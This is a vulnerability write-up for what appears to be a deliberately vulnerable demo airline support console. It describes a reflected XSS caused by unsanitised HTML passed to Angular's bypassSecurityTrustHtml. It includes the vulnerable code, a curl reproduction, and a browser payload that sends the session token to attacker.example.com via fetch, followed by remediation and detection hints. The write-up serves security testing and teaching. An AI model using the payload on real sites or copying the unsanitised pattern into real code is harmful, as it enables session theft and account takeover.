# VULN-170 — Reflected XSS in the support message preview (`bypassSecurityTrustHtml`)

| Field | Value |
|-------|-------|
| ID | VULN-170 |
| Domain | frontend / platform support console |
| CWE | CWE-79 (Improper Neutralization of Input During Web Page Generation) |
| OWASP Top 10 (2021) | A03:2021 – Injection |
| Severity | High |
| Location | `frontend/src/app/pages/support.page.ts` (sink: `bypassSecurityTrustHtml` + `[innerHTML]`), `backend/app/routers/platform_support.py:71-81` (echo) |
| Introduced by | Workstream 12 — platform (`devin/iberia-platform`) |

## Description

The support console's reply composer lets an agent write "rich text" and press *Render preview*.
The body is POSTed to `POST /api/platform/support/preview`, which wraps it in a `<div>` and
returns it as `html` with **no sanitisation or escaping**:

```python
html = f"<div class='support-preview'>{payload.body}</div>"
```

The page then injects that string straight into the DOM:

```ts
// <div class="notice" [innerHTML]="previewHtml"></div>
this.previewHtml = this.sanitizer.bypassSecurityTrustHtml(preview.html);
```

Any markup in the body executes in the victim's origin. With no CSP (VULN-151) the payload can
also load remote script, and the session JWT sits in `localStorage` (VULN-171) where injected
script can read it.

## Reproduction

Server-side echo (no browser needed):

```bash
curl -s -X POST http://127.0.0.1:8000/api/platform/support/preview \
  -H 'Content-Type: application/json' \
  -d '{"subject":"x","body":"<img src=x onerror=alert(document.domain)>"}'
# {"subject":"x","html":"<div class='support-preview'><img src=x onerror=alert(document.domain)></div>",...}
```

In the browser:

1. Sign in at http://localhost:5173 as `agent@iberia.demo` / `Iberia2026!`.
2. Go to **Support** (`/support`).
3. Paste into *Message body*:
   `<img src=x onerror="fetch('https://attacker.example.com/?t='+localStorage.getItem('iberia.token'))">`
4. Press **Render preview** — the handler fires and the token is exfiltrated.

Expected insecure result: attacker-supplied script executes on the Iberia origin and can read
`localStorage`, call the API as the victim, or rewrite the page.

## Blast radius

Any agent or passenger who can be induced to render attacker-controlled content (a share link,
a pasted "template", or a stored support message once one is echoed through the same preview
path) loses their session token and, through it, access to bookings, payments and — via
VULN-172 — the passenger-wide broadcast function.

## Intended remediation

* Never render server-supplied HTML: drop `bypassSecurityTrustHtml` and render the body as text
  (`{{ preview.text }}`), or let Angular's default sanitiser strip the markup.
* If HTML really is required, sanitise with an allow-list (DOMPurify client-side, `bleach`
  server-side) and return escaped text from the API instead of raw markup.
* Add a strict `Content-Security-Policy` (see VULN-151) as defence in depth.

## Detection hints

* Grep: `bypassSecurityTrust`, `[innerHTML]`, and f-string HTML construction in routers.
* The API response for `/api/platform/support/preview` contains the payload verbatim.
* Test: `backend/tests/test_platform_support.py::test_preview_echoes_html_unsanitised`.
